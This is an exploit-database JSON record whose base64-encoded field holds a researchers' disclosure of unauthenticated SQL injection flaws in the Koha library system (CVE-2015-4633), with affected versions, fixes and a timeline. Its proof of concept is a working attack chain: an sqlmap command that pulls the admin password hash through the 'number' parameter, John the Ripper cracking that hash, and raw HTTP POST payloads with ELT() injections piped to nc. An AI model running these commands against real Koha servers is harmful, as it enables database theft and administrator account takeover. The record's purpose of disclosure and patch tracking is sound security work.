{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBLb2hhIE9wZW4gU291cmNlIElMUyAtIFVuYXV0aGVudGljYXRlZCBTUUwgSW5qZWN0aW9uIGluIE9QQUMNCiMgR29vZ2xlIERvcms6DQojIERhdGU6IDI1LzA2LzIwMTUNCiMgRXhwbG9pdCBBdXRob3I6IFJhc2NoaW4gVGF2YWtvbGksIEJlcm5oYXJkIEdhcm4sIFBldGVyIEF1Zm5lciBhbmQgRGltaXRyaXMgU2ltb3MgLSBDb21iaW5hdG9yaWFsIFNlY3VyaXR5IFRlc3RpbmcgR3JvdXAgb2YgU0JBIFJlc2VhcmNoIChjc3RAc2JhLXJlc2VhcmNoLm9yZykNCiMgVmVuZG9yIEhvbWVwYWdlOiBrb2hhLWNvbW11bml0eS5vcmcNCiMgU29mdHdhcmUgTGluazogaHR0cHM6Ly9naXRodWIuY29tL0tvaGEtQ29tbXVuaXR5L0tvaGENCiMgVmVyc2lvbjogMy4yMC54IDw9IDMuMjAuMSwgMy4xOC54IDw9IDMuMTguOCwgMy4xNi54IDw9IDMuMTYuMTINCiMgVGVzdGVkIG9uOiBEZWJpYW4gTGludXgNCiMgQ1ZFIDogQ1ZFLTIwMTUtNDYzMw0KDQoNCg0KDQojIyMgQ1ZFLTIwMTUtNDYzMyAjIyMgDQoNCiMjIyMgVGl0ZWw6ICMjIyMNClVuYXV0aGVudGljYXRlZCBTUUwgSW5qZWN0aW9uIGluIEtvaGENCg0KIyMjIyBUeXBlIG9mIHZ1bG5lcmFiaWxpdHk6ICMjIyMNCkFuIFVuYXV0aGVudGljYXRlZCBTUUwgSW5qZWN0aW9uIHZ1bG5lcmFiaWxpdHkgaW4gS29oYSBhbGxvd3MgYXR0YWNrZXJzIHRvIHJlYWQgYXJiaXRyYXJ5IGRhdGEgZnJvbSB0aGUgZGF0YWJhc2UuIA0KDQojIyMjIyBFeHBsb2l0YXRpb24gdmVjdG9yOg0KVGhlIHVybCBwYXJhbWV0ZXIgJ251bWJlcicgb2YgdGhlIC9jZ2ktYmluL2tvaGEvb3BhYy10YWdzX3N1YmplY3QucGwgaXMgdnVsbmVyYWJsZSB0byBTUUxJLg0KDQojIyMjIyBBdHRhY2sgb3V0Y29tZToNCkFuIGF0dGFja2VyIGNhbiByZWFkIGFyYml0cmFyeSBkYXRhIGZyb20gdGhlIGRhdGFiYXNlLiBJZiB0aGUgd2Vic2VydmVyIGlzIG1pc2NvbmZpZ3VyZWQsIHJlYWQgJiB3cml0ZSBhY2Nlc3MgdGhlIGZpbGVzeXN0ZW0gbWF5IGJlIHBvc3NpYmxlLg0KDQojIyMjIEltcGFjdDogIyMjIw0KY3JpdGljYWwNCg0KIyMjIyBTb2Z0d2FyZS9Qcm9kdWN0IG5hbWU6ICMjIyMNCktvaGENCg0KIyMjIyBBZmZlY3RlZCB2ZXJzaW9uczogIyMjIw0KKiA8PSBLb2hhIDMuMjAuMQ0KKiA8PSBLb2hhIDMuMTguOCANCiogPD0gS29oYSAzLjE2LjEyDQoNCiMjIyMgRml4ZWQgaW4gdmVyc2lvbjogIyMjIw0KKiB2ZXJzaW9uIDMuMjAuMSBodHRwOi8va29oYS1jb21tdW5pdHkub3JnL3NlY3VyaXR5LXJlbGVhc2Uta29oYS0zLTIwLTEvLA0KKiB2ZXJzaW9uIDMuMTguOCBodHRwOi8va29oYS1jb21tdW5pdHkub3JnL3NlY3VyaXR5LXJlbGVhc2Uta29oYS0zLTE4LTgvLCANCiogdmVyc2lvbiAzLjE2LjEyIGh0dHA6Ly9rb2hhLWNvbW11bml0eS5vcmcvc2VjdXJpdHktcmVsZWFzZS1rb2hhLTMtMTYtMTIvDQoNCiMjIyMgVmVuZG9yOiAjIyMjDQpodHRwOi8va29oYS1jb21tdW5pdHkub3JnLyAoT3BlbiBTb3VyY2UpDQoNCiMjIyMgQ1ZFIG51bWJlcjogIyMjIw0KQ1ZFLTIwMTUtNDYzMw0KDQojIyMjIFRpbWVsaW5lICMjIyMNCiogYDIwMTUtMDYtMThgIGlkZW50aWZpY2F0aW9uIG9mIHZ1bG5lcmFiaWxpdHkgDQoqIGAyMDE1LTA2LTE4YCAxc3QgY29udGFjdCB0byByZWxlYXNlIG1haW50YWluZXIsIGltbWVkaWF0ZSByZXBseQ0KKiBgMjAxNS0wNi0yM2AgbmV3IHJlbGVhc2Ugd2l0aCBmaXhlZCB2dWxuZXJhYmlsaXRpZXMNCg0KIyMjIyBDcmVkaXRzOiAjIyMjDQpSR2hhbmFkLVRhdmFrb2xpQHNiYS1yZXNlYXJjaC5vcmcNCi0tLQ0KVnVsbmVyYWJpbGl0eSBEaXNjbG9zdXJlIGJ5IENvbWJpbmF0b3JpYWwgU2VjdXJpdHkgVGVzdGluZyBHcm91cCBvZiBTQkEgUmVzZWFyY2guDQpDb250YWN0OiBjc3RAc2JhLXJlc2VhcmNoLm9yZw0KDQojIyMjIFJlZmVyZW5jZXM6DQpodHRwOi8vYnVncy5rb2hhLWNvbW11bml0eS5vcmcvYnVnemlsbGEzL3Nob3dfYnVnLmNnaT9pZD0xNDQxMg0KaHR0cDovL2tvaGEtY29tbXVuaXR5Lm9yZy9zZWN1cml0eS1yZWxlYXNlLWtvaGEtMy0yMC0xLw0KaHR0cDovL2tvaGEtY29tbXVuaXR5Lm9yZy9zZWN1cml0eS1yZWxlYXNlLWtvaGEtMy0xOC04Lw0KaHR0cDovL2tvaGEtY29tbXVuaXR5Lm9yZy9zZWN1cml0eS1yZWxlYXNlLWtvaGEtMy0xNi0xMi8NCg0KIyMjIyBEZXNjcmlwdGlvbjogIyMjIw0KQnkgbWFuaXB1bGF0aW5nIHRoZSB2YXJpYWJsZSAnbnVtYmVyJyBvZiB0aGUgL2NnaS1iaW4va29oYS9vcGFjLXRhZ3Nfc3ViamVjdC5wbCBzY3JpcHQgdGhlIGRhdGFiYXNlIGNhbiBiZSBhY2Nlc3NlZCB2aWEgdGltZS1iYXNlZCBibGluZCBpbmplY3Rpb25zLiBJZiB0aGUgd2Vic2VydmVyIGlzIG1pc2NvbmZpZ3VyZWQsIHRoZSBmaWxlLXN5c3RlbSBjYW4gYmUgYWNjZXNzZWQgYXMgd2VsbC4NCg0KIyMjIyBQcm9vZi1vZi1jb25jZXB0OiAjIyMjDQoxLiBJbnNwZWN0IEtvaGEgZGF0YWJhc2Ugc2NoZW1hDQoNCiAgIEhhdmUgYSBsb29rIGF0IGhvdyB0byBxdWVyeSB0aGUgZGF0YWJhc2UgZm9yIHN1cGVybGlicmFyaWFuIHVzZXJzOg0KICAgaHR0cDovL3dpa2kua29oYS1jb21tdW5pdHkub3JnL3dpa2kvU1FMX1JlcG9ydHNfTGlicmFyeSNTdXBlcmxpYnJhcmlhbnMNCg0KICAgU28gYmFzaWNhbGx5IHdlIHdlIG5lZWQgdG8gZXhlY3V0ZSBzb21lIFNRTCBzdGF0ZW1lbnQgbGlrZSB0aGlzOg0KICAgc3FsLXNoZWxsPiBzZWxlY3QgdXNlcmlkLCBwYXNzd29yZCBmcm9tIGJvcnJvd2VycyB3aGVyZSBmbGFncz0xIGFuZCBwYXNzd29yZCBpcyBub3QgbnVsbCBvcmRlciBieSBib3Jyb3dlcm51bWJlciBkZXNjIGxpbWl0IDE7DQoNCjIuIFF1ZXJ5IHRoZSBkYXRhYmFzZSB3aXRoIHNxbG1hcA0KDQogICBTbyBsZXQncyBmaXJlIHVwIHNxbG1hcCB3aXRoIHRoZSAtLXNxbC1zaGVsbCBwYXJhbWV0ZXIgYW5kIGlucHV0IHRoZSBxdWVyeToNCg0KICAgcm9vdEBrYWxpOi9ob21lL3dpY2tlZCMgc3FsbWFwIC11IGh0dHA6Ly90ZXN0Ym94OjkwMDEvY2dpLWJpbi9rb2hhL29wYWMtdGFnc19zdWJqZWN0LnBsP251bWJlcj0xMCAtcCBudW1iZXIgLS10ZWNobmlxdWU9VCAtLWRibXM9TXlTUUwgLS1zcWwtc2hlbGwgLS10aW1lLXNlYz00DQogICAgICAgICBfDQogICAgX19fIF9fX3wgfF9fX19fIF9fXyBfX18gIHsxLjAtZGV2LW5vbmdpdC0yMDE1MDUxM30NCiAgIHxfIC18IC4gfCB8ICAgICB8IC4nfCAuIHwNCiAgIHxfX198XyAgfF98X3xffF98X18sfCAgX3wNCiAgICAgICAgIHxffCAgICAgICAgICAgfF98ICAgaHR0cDovL3NxbG1hcC5vcmcNCg0KICAgWyFdIGxlZ2FsIGRpc2NsYWltZXI6IFVzYWdlIG9mIHNxbG1hcCBmb3IgYXR0YWNraW5nIHRhcmdldHMgd2l0aG91dCBwcmlvciBtdXR1YWwgY29uc2VudCBpcyBpbGxlZ2FsLiBJdCBpcyB0aGUgZW5kIHVzZXIncyByZXNwb25zaWJpbGl0eSB0byBvYmV5IGFsbCBhcHBsaWNhYmxlIGxvY2FsLCBzdGF0ZSBhbmQgZmVkZXJhbCBsYXdzLiBEZXZlbG9wZXJzIGFzc3VtZSBubyBsaWFiaWxpdHkgYW5kIGFyZSBub3QgcmVzcG9uc2libGUgZm9yIGFueSBtaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0NCg0KICAgWypdIHN0YXJ0aW5nIGF0IDA5OjIwOjA3DQoNCiAgIFswOToyMDowN10gW0lORk9dIHRlc3RpbmcgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IFVSTA0KICAgc3FsbWFwIGlkZW50aWZpZWQgdGhlIGZvbGxvd2luZyBpbmplY3Rpb24gcG9pbnRzIHdpdGggYSB0b3RhbCBvZiAwIEhUVFAocykgcmVxdWVzdHM6DQogICAtLS0NCiAgIFBhcmFtZXRlcjogbnVtYmVyIChHRVQpDQogICAgICAgVHlwZTogQU5EL09SIHRpbWUtYmFzZWQgYmxpbmQNCiAgICAgICBUaXRsZTogTXlTUUwgPj0gNS4xIHRpbWUtYmFzZWQgYmxpbmQgLSBQUk9DRURVUkUgQU5BTFlTRSAoRVhUUkFDVFZBTFVFKQ0KICAgICAgIFBheWxvYWQ6IG51bWJlcj0xIFBST0NFRFVSRSBBTkFMWVNFKEVYVFJBQ1RWQUxVRSg5NzQzLENPTkNBVCgweDVjLChCRU5DSE1BUksoNDAwMDAwMCxNRDUoMHg0Yjc1NGE0YikpKSkpLDEpDQogICAtLS0NCiAgIFswOToyMDowOV0gW0lORk9dIHRlc3RpbmcgTXlTUUwNCiAgIFswOToyMDowOV0gW0lORk9dIGNvbmZpcm1pbmcgTXlTUUwNCiAgIFswOToyMDowOV0gW0lORk9dIHRoZSBiYWNrLWVuZCBEQk1TIGlzIE15U1FMDQogICB3ZWIgc2VydmVyIG9wZXJhdGluZyBzeXN0ZW06IExpbnV4IERlYmlhbg0KICAgd2ViIGFwcGxpY2F0aW9uIHRlY2hub2xvZ3k6IEFwYWNoZSAyLjQuMTANCiAgIGJhY2stZW5kIERCTVM6IE15U1FMID49IDUuMC4wDQogICBbMDk6MjA6MDldIFtJTkZPXSBjYWxsaW5nIE15U1FMIHNoZWxsLiBUbyBxdWl0IHR5cGUgJ3gnIG9yICdxJyBhbmQgcHJlc3MgRU5URVINCg0KICAgc3FsLXNoZWxsPiBzZWxlY3QgdXNlcmlkLCBwYXNzd29yZCBmcm9tIGJvcnJvd2VycyB3aGVyZSBmbGFncz0xIGFuZCBwYXNzd29yZCBpcyBub3QgbnVsbCBvcmRlciBieSBib3Jyb3dlcm51bWJlciBkZXNjIGxpbWl0IDE7DQogICBbMDk6MjA6MjVdIFtJTkZPXSBmZXRjaGluZyBTUUwgU0VMRUNUIHN0YXRlbWVudCBxdWVyeSBvdXRwdXQ6ICdzZWxlY3QgdXNlcmlkLCBwYXNzd29yZCBmcm9tIGJvcnJvd2VycyB3aGVyZSBmbGFncz0xIGFuZCBwYXNzd29yZCBpcyBub3QgbnVsbCBvcmRlciBieSBib3Jyb3dlcm51bWJlciBkZXNjIGxpbWl0IDEnDQogICBbMDk6MjA6MjVdIFtJTkZPXSB0aGUgU1FMIHF1ZXJ5IHByb3ZpZGVkIGhhcyBtb3JlIHRoYW4gb25lIGZpZWxkLiBzcWxtYXAgd2lsbCBub3cgdW5wYWNrIGl0IGludG8gZGlzdGluY3QgcXVlcmllcyB0byBiZSBhYmxlIHRvIHJldHJpZXZlIHRoZSBvdXRwdXQgZXZlbiBpZiB3ZSBhcmUgZ29pbmcgYmxpbmQNCiAgIFswOToyMDoyNV0gW1dBUk5JTkddIHRpbWUtYmFzZWQgY29tcGFyaXNvbiByZXF1aXJlcyBsYXJnZXIgc3RhdGlzdGljYWwgbW9kZWwsIHBsZWFzZSB3YWl0Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgIFswOToyMDo1Ml0gW1dBUk5JTkddIGl0IGlzIHZlcnkgaW1wb3J0YW50IG5vdCB0byBzdHJlc3MgdGhlIG5ldHdvcmsgYWRhcHRlciBkdXJpbmcgdXNhZ2Ugb2YgdGltZS1iYXNlZCBwYXlsb2FkcyB0byBwcmV2ZW50IHBvdGVudGlhbCBlcnJvcnMgDQogICBhZG1pbg0KICAgWzA5OjIxOjQ2XSBbSU5GT10gcmV0cmlldmVkOiAkMmEkMDgkdGFRDQogICBbMDk6MjM6MzNdIFtFUlJPUl0gaW52YWxpZCBjaGFyYWN0ZXIgZGV0ZWN0ZWQuIHJldHJ5aW5nLi4NCiAgIFswOToyMzozM10gW1dBUk5JTkddIGluY3JlYXNpbmcgdGltZSBkZWxheSB0byA1IHNlY29uZHMgDQogICBhZk9nRUVoVQ0KICAgWzA5OjI1OjEwXSBbRVJST1JdIGludmFsaWQgY2hhcmFjdGVyIGRldGVjdGVkLiByZXRyeWluZy4uDQogICBbMDk6MjU6MTBdIFtXQVJOSU5HXSBpbmNyZWFzaW5nIHRpbWUgZGVsYXkgdG8gNiBzZWNvbmRzIA0KICAgdC9nVw0KICAgWzA5OjI2OjEzXSBbRVJST1JdIGludmFsaWQgY2hhcmFjdGVyIGRldGVjdGVkLiByZXRyeWluZy4uDQogICBbMDk6MjY6MTNdIFtXQVJOSU5HXSBpbmNyZWFzaW5nIHRpbWUgZGVsYXkgdG8gNyBzZWNvbmRzIA0KICAgVE9tcW5ZZTFZNlpOeENFTmENCiAgIFswOToyOTo1N10gW0VSUk9SXSBpbnZhbGlkIGNoYXJhY3RlciBkZXRlY3RlZC4gcmV0cnlpbmcuLg0KICAgWzA5OjI5OjU3XSBbV0FSTklOR10gaW5jcmVhc2luZyB0aW1lIGRlbGF5IHRvIDggc2Vjb25kcyANCiAgIDIuT05rMmVaaG51RXc1ejlPamp4Uw0KICAgWzA5OjM1OjA4XSBbRVJST1JdIGludmFsaWQgY2hhcmFjdGVyIGRldGVjdGVkLiByZXRyeWluZy4uDQogICBbMDk6MzU6MDhdIFtXQVJOSU5HXSBpbmNyZWFzaW5nIHRpbWUgZGVsYXkgdG8gOSBzZWNvbmRzIA0KDQogICBzZWxlY3QgdXNlcmlkLCBwYXNzd29yZCBmcm9tIGJvcnJvd2VycyB3aGVyZSBmbGFncz0xIGFuZCBwYXNzd29yZCBpcyBub3QgbnVsbCBvcmRlciBieSBib3Jyb3dlcm51bWJlciBkZXNjIGxpbWl0IDE7OiAgICANCiAgICdhZG1pbiwgJDJhJDA4JHRhUWFmT2dFRWhVdC9nV1RPbXFuWWUxWTZaTnhDRU5hMi5PTmsyZVpobnVFdzV6OU9qanhTJw0KDQozLiBGZWVkIGpvaG4gdGhlIHJpcHBlciBhbmQgYmUgbHVja3kNCg0KICAgcm9vdEBrYWxpOi9ob21lL3dpY2tlZCMgZWNobyAiJDJhJDA4JHRhUWFmT2dFRWhVdC9nV1RPbXFuWWUxWTZaTnhDRU5hMi5PTmsyZVpobnVFdzV6OU9qanhTIiA+IC4vYWRtaW4tcGFzcw0KICAgcm9vdEBrYWxpOi9ob21lL3dpY2tlZCMgam9obiAuL2FkbWluLXBhc3MgDQogICBMb2FkZWQgMSBwYXNzd29yZCBoYXNoIChPcGVuQlNEIEJsb3dmaXNoIFszMi82NCBYMl0pDQogICBhZG1pbiAgICAgICAgICAgICg/KQ0KICAgZ3Vlc3NlczogMSAgdGltZTogMDowMDowMDoxMCBET05FIChUaHUgSnVuIDI1IDA5OjQ1OjQxIDIwMTUpICBjL3M6IDI2MCAgdHJ5aW5nOiBTbW9rZXkgLSBhbGxzdGF0ZQ0KICAgVXNlIHRoZSAiLS1zaG93IiBvcHRpb24gdG8gZGlzcGxheSBhbGwgb2YgdGhlIGNyYWNrZWQgcGFzc3dvcmRzIHJlbGlhYmx5DQoNCiAgIHJvb3RAa2FsaTovaG9tZS93aWNrZWQjIGpvaG4gLi9hZG1pbi1wYXNzIC0tc2hvdw0KICAgPzphZG1pbg0KDQogICAxIHBhc3N3b3JkIGhhc2ggY3JhY2tlZCwgMCBsZWZ0DQoNCg0KNC4gTG9nIGluIHdpdGggdXNlcm5hbWUgImFkbWluIiBhbmQgcGFzc3dvcmQgImFkbWluIiA7KQ0KDQoNCg0KDQoNCg0KDQoNCg0KDQojIyMgQ1ZFLTIwMTUteHh4eCAjIyMgDQoNCiMjIyMgVGl0ZWw6ICMjIyMNClVuYXV0aGVudGljYXRlZCBTUUwgSW5qZWN0aW9uDQoNCiMjIyMgVHlwZSBvZiB2dWxuZXJhYmlsaXR5OiAjIyMjDQpTUUwgSW5qZWN0aW9uIHZ1bG5lcmFiaWxpdGllcyBpbiBLb2hhIHN0YWZmIGNsaWVudCBhbGxvd3MgYXR0YWNrZXJzIHRvIHJlYWQgYXJiaXRyYXJ5IGRhdGEgZnJvbSB0aGUgZGF0YWJhc2UuIA0KDQojIyMjIyBFeHBsb2l0YXRpb24gdmVjdG9yOg0KVGhlIHVybCBwYXJhbWV0ZXIgJ251bWJlcicgb2YgdGhlIC9jZ2ktYmluL2tvaGEvb3BhYy10YWdzX3N1YmplY3QucGwgaXMgdnVsbmVyYWJsZSB0byBTUUxJLg0KDQojIyMjIyBBdHRhY2sgb3V0Y29tZToNCkFuIGF0dGFja2VyIGNhbiByZWFkIGFyYml0cmFyeSBkYXRhIGZyb20gdGhlIGRhdGFiYXNlLiBJZiB0aGUgd2Vic2VydmVyIGlzIG1pc2NvbmZpZ3VyZWQsIHJlYWQgJiB3cml0ZSBhY2Nlc3MgdG8gdGhlIGZpbGVzeXN0ZW0gaXMgcG9zc2libGUuDQoNCiMjIyMgSW1wYWN0OiAjIyMjDQpjcml0aWNhbA0KDQojIyMjIFNvZnR3YXJlL1Byb2R1Y3QgbmFtZTogIyMjIw0KS29oYQ0KDQojIyMjIEFmZmVjdGVkIHZlcnNpb25zOiAjIyMjDQoqIDw9IEtvaGEgMy4yMC4xDQoqIDw9IEtvaGEgMy4xOC44IA0KKiA8PSBLb2hhIDMuMTYuMTINCg0KIyMjIyBGaXhlZCBpbiB2ZXJzaW9uOiAjIyMjDQoqIHZlcnNpb24gMy4yMC4xIGh0dHA6Ly9rb2hhLWNvbW11bml0eS5vcmcvc2VjdXJpdHktcmVsZWFzZS1rb2hhLTMtMjAtMS8sDQoqIHZlcnNpb24gMy4xOC44IGh0dHA6Ly9rb2hhLWNvbW11bml0eS5vcmcvc2VjdXJpdHktcmVsZWFzZS1rb2hhLTMtMTgtOC8sIA0KKiB2ZXJzaW9uIDMuMTYuMTIgaHR0cDovL2tvaGEtY29tbXVuaXR5Lm9yZy9zZWN1cml0eS1yZWxlYXNlLWtvaGEtMy0xNi0xMi8NCg0KIyMjIyBWZW5kb3I6ICMjIyMNCmh0dHA6Ly9rb2hhLWNvbW11bml0eS5vcmcvIChPcGVuIFNvdXJjZSkNCg0KIyMjIyBDVkUgbnVtYmVyOiAjIyMjDQpDVkUtMjAxNS14eHh4DQoNCiMjIyMgVGltZWxpbmUgIyMjIw0KKiBgMjAxNS0wNi0xOGAgaWRlbnRpZmljYXRpb24gb2YgdnVsbmVyYWJpbGl0eSANCiogYDIwMTUtMDYtMThgIDFzdCBjb250YWN0IHRvIHJlbGVhc2UgbWFpbnRhaW5lciwgaW1tZWRpYXRlIHJlcGx5DQoqIGAyMDE1LTA2LTIzYCBuZXcgcmVsZWFzZSB3aXRoIGZpeGVkIHZ1bG5lcmFiaWxpdGllcw0KDQojIyMjIENyZWRpdHM6ICMjIyMNClJHaGFuYWQtVGF2YWtvbGlAc2JhLXJlc2VhcmNoLm9yZw0KLS0tDQpWdWxuZXJhYmlsaXR5IERpc2Nsb3N1cmUgYnkgQ29tYmluYXRvcmlhbCBTZWN1cml0eSBUZXN0aW5nIEdyb3VwIG9mIFNCQSBSZXNlYXJjaC4NCkNvbnRhY3Q6IGNzdEBzYmEtcmVzZWFyY2gub3JnDQoNCiMjIyMgUmVmZXJlbmNlczoNCmh0dHA6Ly9idWdzLmtvaGEtY29tbXVuaXR5Lm9yZy9idWd6aWxsYTMvc2hvd19idWcuY2dpP2lkPTE0NDI2DQpodHRwOi8va29oYS1jb21tdW5pdHkub3JnL3NlY3VyaXR5LXJlbGVhc2Uta29oYS0zLTIwLTEvDQpodHRwOi8va29oYS1jb21tdW5pdHkub3JnL3NlY3VyaXR5LXJlbGVhc2Uta29oYS0zLTE4LTgvDQpodHRwOi8va29oYS1jb21tdW5pdHkub3JnL3NlY3VyaXR5LXJlbGVhc2Uta29oYS0zLTE2LTEyLw0KDQojIyMjIERlc2NyaXB0aW9uOiAjIyMjDQpCeSBtYW5pcHVsYXRpbmcgdGhlIHZhcmlhYmxlICdudW1iZXInIG9mIHRoZSAvY2dpLWJpbi9rb2hhL29wYWMtdGFnc19zdWJqZWN0LnBsIHNjcmlwdCB0aGUgZGF0YWJhc2UgY2FuIGJlIGFjY2Vzc2VkIHZpYSB0aW1lLWJhc2VkIGJsaW5kIGluamVjdGlvbnMuIElmIHRoZSB3ZWJzZXJ2ZXIgaXMgbWlzY29uZmlndXJlZCwgdGhlIGZpbGUtc3lzdGVtIGNhbiBiZSBhY2Nlc3NlZCBhcyB3ZWxsLg0KDQojIyMjIFByb29mLW9mLWNvbmNlcHQ6ICMjIyMNCmVjaG8gLW5lICJQT1NUIC9jZ2ktYmluL2tvaGEvcmVwb3J0cy9ib3Jyb3dlcnNfb3V0LnBsIEhUVFAvMS4xXHJcbkhvc3Q6IHRlc3Rib3g6OTAwMlxyXG5Db250ZW50LUxlbmd0aDogMTg2XHJcblxyXG5GaWx0ZXI9UF9DT00mRmlsdGVyPSZMaW1pdD0mb3V0cHV0PWZpbGUmYmFzZW5hbWU9RXhwb3J0Jk1JTUU9Q1NWJnNlcD0lM0ImcmVwb3J0X25hbWU9JmRvX2l0PTEmdXNlcmlkPTx1c2VybmFtZT4mcGFzc3dvcmQ9PHBhc3N3b3JkPiZicmFuY2g9JmtvaGFfbG9naW5fY29udGV4dD1pbnRyYW5ldCZDcml0ZXJpYT1FTFQoMT0yLCdldmlsJykiIHwgbmMgdGVzdGJveCA5MDAyDQoNCmVjaG8gLW5lICJQT1NUIC9jZ2ktYmluL2tvaGEvcmVwb3J0cy9ib3Jyb3dlcnNfb3V0LnBsIEhUVFAvMS4xXHJcbkhvc3Q6IHRlc3Rib3g6OTAwMlxyXG5Db250ZW50LUxlbmd0aDogMTg2XHJcblxyXG5GaWx0ZXI9UF9DT00mRmlsdGVyPSZMaW1pdD0mb3V0cHV0PWZpbGUmYmFzZW5hbWU9RXhwb3J0Jk1JTUU9Q1NWJnNlcD0lM0ImcmVwb3J0X25hbWU9JmRvX2l0PTEmdXNlcmlkPTx1c2VybmFtZT4mcGFzc3dvcmQ9PHBhc3N3b3JkPiZicmFuY2g9JmtvaGFfbG9naW5fY29udGV4dD1pbnRyYW5ldCZDcml0ZXJpYT1FTFQoMT0xLCdldmlsJykiIHwgbmMgdGVzdGJveCA5MDAy", 
    "filename": "platforms/php/webapps/37387.txt", 
    "id": "37387", 
    "cves": [
        "CVE-2015-4633"
    ]
}